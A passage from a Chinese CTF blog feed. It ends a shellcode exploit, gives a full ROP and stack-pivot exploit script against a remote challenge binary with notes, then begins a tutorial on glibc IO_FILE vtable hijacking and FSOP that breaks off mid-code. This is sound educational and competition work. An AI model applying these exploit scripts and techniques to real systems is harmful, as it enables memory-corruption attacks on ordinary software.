eax&#x27;</span>)) <span class="comment">#同上</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;push rdx;pop rsi&#x27;</span>)) <span class="comment">#mov rsi,rdx是三个字节长度</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    movabs rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mov rax, 0x2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, rax     </span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;want?\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.send(asm(preamble[i]))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x100</span> + asm(sc))</span><br><span class="line"><span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;Fire!\n&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure><p>因为open函数执行后,文件描述符存储在rax,所以直接rax赋值给rdi就行了</p><h2 id="Play-with-rop"><a href="#Play-with-rop" class="headerlink" title="Play-with-rop"></a>Play-with-rop</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>存在溢出但只能控制rbp和rip,故需要先进行栈迁移</p><p>第一次通过再调用一次main中的read往迁移后的rbp-0x30写来进一步获得栈迁移的能力</p><p>之后栈迁移后利用puts函数将broken_keys打印出来,在跳转到wonderland获得加密后的flag</p><p>这题不算很难,但做的时候栈迁移的位置不好,被printf的栈越界卡住了</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./chall&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;1.12.48.154&quot;</span>, <span class="number">2224</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_rsi_rdx = <span class="number">0x4012A9</span></span><br><span class="line"></span><br><span class="line">key0_addr = <span class="number">0x4040B0</span></span><br><span class="line">key1_addr = key0_addr + <span class="number">0x8</span></span><br><span class="line">key2_addr = key1_addr + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">lea_ret = <span class="number">0x04016B4</span></span><br><span class="line">read_again = <span class="number">0x401686</span>   <span class="comment">#这个read是往rbp-0x30写</span></span><br><span class="line">wonderland = <span class="number">0x4012D6</span></span><br><span class="line"></span><br><span class="line">fake_rbp = <span class="number">0x404600</span> + <span class="number">0x880</span> <span class="comment"># +0x880 to ensure fake stack is large enough for puts</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span> + p64(fake_rbp) + p64(read_again)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;leave your name&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi_rsi_rdx) + p64(<span class="number">0</span>) + p64(fake_rbp-<span class="number">0x30</span>) + p64(<span class="number">0x100</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(fake_rbp-<span class="number">0x38</span>) + p64(lea_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_rsi_rdx) + p64(key0_addr) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(puts) + p64(pop_rdi_rsi_rdx) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(wonderland)</span><br><span class="line">p.send(payload3)</span><br><span class="line">data = p.recvuntil(<span class="string">b&#x27;flag:&#x27;</span>)</span><br><span class="line">keys = data[<span class="number">77</span>:<span class="number">77</span>+<span class="number">24</span>] <span class="comment"># 77是通过计算字符数得到的,不晓得为什么先接收77个字节再改动keys不能成功</span></span><br><span class="line">k0 = u64(keys[:<span class="number">8</span>])</span><br><span class="line">k1 = u64(keys[<span class="number">8</span>:<span class="number">16</span>]) ^ k0</span><br><span class="line">k2 = u64(keys[<span class="number">16</span>:<span class="number">24</span>]) ^ k1</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(k0), <span class="built_in">hex</span>(k1), <span class="built_in">hex</span>(k2))</span><br><span class="line"></span><br><span class="line">flag = p.recv().strip()</span><br><span class="line">real_flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">real_flag += (u64(flag[:<span class="number">8</span>])    ^ k0).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">8</span>:<span class="number">16</span>])  ^ k1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">16</span>:<span class="number">24</span>]) ^ k2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">24</span>:<span class="number">32</span>]) ^ k0).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">32</span>:<span class="number">40</span>]) ^ k1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">40</span>:<span class="number">48</span>]) ^ k2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(real_flag)</span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><details class="folding-tag" blue><summary> 0x1不要过于依赖反汇编 </summary>              <div class='content'>              <p>很多细节其实是藏在汇编代码中的,如果过于依赖反汇编就很难发现这部分细节</p>              </div>            </details><details class="folding-tag" blue><summary> 0x2用pwntools汇编注意设置环境 </summary>              <div class='content'>              <p>pwntools,asm功能默认是在i386下,如果不设置环境的可能会出大错</p>              </div>            </details><details class="folding-tag" blue><summary> 0x3出现过的库函数皆可使用 </summary>              <div class='content'>              <p>只要函数被调用过,并布置好参数,所有的库函数都可以被使用,太久没做栈迁移,竟然忘记用可以用read部署了……….</p>              </div>            </details><details class="folding-tag" blue><summary> 0x4栈迁移的地址选择 </summary>              <div class='content'>              <p>printf和puts等函数调用时使用的栈空间较大,栈迁移后如果迁移位置不合适,很可能会造成内存越界,访问不可写的内存空间,从而产生段错误,故迁移位置一定要足够合适,一般至少要留0x880的可写空间</p>              </div>            </details>]]></content>
    
    
    <summary type="html">记录一下</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILE</title>
    <link href="https://ixout.github.io/posts/23411/"/>
    <id>https://ixout.github.io/posts/23411/</id>
    <published>2023-04-07T14:43:07.000Z</published>
    <updated>2023-07-21T04:47:48.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>先看IO_FILE结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;  <span class="comment">//重要</span></span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其又被封装于_IO_FILE_plus</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><details class="folding-tag" blue><summary> 其中_IO_jump_t结构体的定义为 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>              </div>            </details><p>一个进程中的所有FILE结构体汇通_chain连接成为一个单链表,链表的头部是全局变量_IO_list_all</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure><h2 id="三个特殊流"><a href="#三个特殊流" class="headerlink" title="三个特殊流"></a>三个特殊流</h2><p>在标准 I/O 库中，每个程序启动时有三个文件流是<strong>自动打开</strong>的：<strong>stdin、stdout、stderr</strong>。</p><p>但是在第一次使用前,均属于未被初始化状态(主要是_IO_read_ptr到_IO_buf_end这个8个域),其初始化时分配的缓冲区位于堆,且一般是堆最早的三个堆块.</p><p>因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，需要注意的是<strong>这三个文件流位于 libc.so 的数据段</strong>。而我们使用 <strong>fopen 创建的文件流是分配在堆内存上</strong>的。</p><p>libc.so 中存在 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><details class="folding-tag" blue><summary> 关于上面这句话的理解 </summary>              <div class='content'>              <p>学习过程中经常遇到符号这个概念,这里学习一下</p><p><strong>在 C 语言中，变量的名字就是符号（symbol）</strong>。当编译器编译源代码时，会在符号表（symbol table）中为每个符号分配一个唯一的标识符，并记录它的类型、作用域和存储位置等信息。对于全局变量和静态变量，它们的符号被放置在全局符号表中，而对于局部变量，则被放置在局部符号表中。</p><p><strong>也就是说一个符号被用来代表一个变量的实例,而这个变量可以是结构体,函数或常规变量类型等等</strong></p><p>在了解了符号之后就能理解上面这句话了</p><p><em>IO_2_1_stderr\</em>和_<em>IO_2_1_stdout\</em>和<em>_IO_2_1_stdin\</em>这三个符号对应的是三个IO_FILE<u>结构体变量的名字</u></p><p>stdin\stdout\stderr三个符号是指向三个IO_FILE结构体变量的<u>指针变量的名字</u></p>              </div>            </details><h2 id="fwrite和fread"><a href="#fwrite和fread" class="headerlink" title="fwrite和fread"></a>fwrite和fread</h2><p>fread 的实现被封装在_IO_fread,真正实现功能的是其中的_IO_sgetn,而_IO_sgetn又会调用_IO_XSGETN,而_IO_XSGETN 是vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。默认情况下_IO_file_xsgetn中存储的指针指向_IO_file_xsgetn</p><p>fwrite的实现被封装在_IO_fwrite中,在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。_IO_XSPUTN是位于vtable中的函数指针,在_IO_XSPUTN 指向的_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW,_IO_OVERFLOW 默认指向的函数是_IO_new_file_overflow</p><h2 id="fopen和fclose"><a href="#fopen和fclose" class="headerlink" title="fopen和fclose"></a>fopen和fclose</h2><p>fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><p>fclose的操作是</p><ul><li>将指定的 FILE 从_chain 链表中脱链</li><li>调用系统接口 close 关闭文件</li><li>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</li></ul><h2 id="printf和puts"><a href="#printf和puts" class="headerlink" title="printf和puts"></a>printf和puts</h2><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><hr><h1 id="2-23及以前利用"><a href="#2-23及以前利用" class="headerlink" title="2.23及以前利用"></a>2.23及以前利用</h1><h2 id="伪造劫持vtable"><a href="#伪造劫持vtable" class="headerlink" title="伪造劫持vtable"></a>伪造劫持vtable</h2><p><strong><u>vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递</u></strong></p><p>原理,修改IO_FILE_plus中的vtable指针,将其劫持到一个可控区域,或者在libc2.23之前的版本也可以直接修改vtable中的函数</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP通过劫持_IO_list_all 变量(管理着由_IO_FILE结构体组成的链表的头部)来伪造假的IO_FILE链,并通过调用_IO_flush_all_lockp来触发假的IO_FILE,</p><h3 id="IO-flush-all-lockp初识"><a href="#IO-flush-all-lockp初识" class="headerlink" title="_IO_flush_all_lockp初识"></a>_IO_flush_all_lockp初识</h3><p>函数会刷新_IO_list_all 链表中所有项的文件流，<strong><u>相当于对每个 FILE 调用 fflush(更新缓存区函数)</u></strong>，也对应着会调用vtable 中的_IO_overflow(以当前_IO_list_all节点指针为参数)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可见要执行_IO_OVERFLOW的前提是:</p><ol><li><strong>fp-&gt;_mode&lt;=0</strong></li><li><strong>fp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</strong></li></ol><p>或者:</p><ol><li><strong>fp-&gt;_mode &gt; 0</strong></li><li><strong>fp-&gt;_wide_data-&gt;_IO_write_ptr&gt;fp-&gt;_wide_data-&gt;_IO_write_bas</strong></li></ol><p>而_IO_flush_all_lockp 在三种情况下会被系统调用：</p><ol><li><strong>当 libc 执行 abort 流程时</strong></li><li><strong>当执行 exit 函数时</strong></li><li><strong>当执行流从 main 函数返回时</strong></li></ol><p>其中abort流程,在堆的利用中经常用到</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/abort_routine.001.jpeg" alt=""></p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li><p>需要攻击者获知 libc.so 基址，因为_IO_list_all 是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写_IO_list_all。</p></li><li><p>要有能改写IO_list_all的手段</p></li><li><p>要能布置一个满足条件的IO_FILE结构体</p></li></ol><h2 id="2-24后新机制下利用"><a href="#2-24后新机制下利用" class="headerlink" title="2.24后新机制下利用"></a>2.24后新机制下利用</h2><h3 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h3><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在<strong>调用虚函数之前</strong>首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title 